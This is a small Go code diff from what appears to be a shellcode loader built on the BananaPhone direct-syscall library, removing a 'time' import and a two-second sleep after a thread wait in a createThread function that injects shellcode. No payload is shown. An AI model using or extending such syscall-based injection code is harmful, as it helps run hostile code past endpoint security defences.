@@ -3,7 +3,6 @@ package main
 import (
 	"fmt"
 	"syscall"
-	"time"
 	"unsafe"
 
 	bananaphone "github.com/C-Sto/BananaPhone/pkg/BananaPhone"
@@ -108,7 +107,6 @@ func createThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid
 		0,                                    //lpbytesbuffer
 	)
 	syscall.WaitForSingleObject(syscall.Handle(hhosthread), 0xffffffff)
-	time.Sleep(time.Second * 2)
 	if r != nil {
 		fmt.Printf("1 %s %x\n", r, r1)
 		return
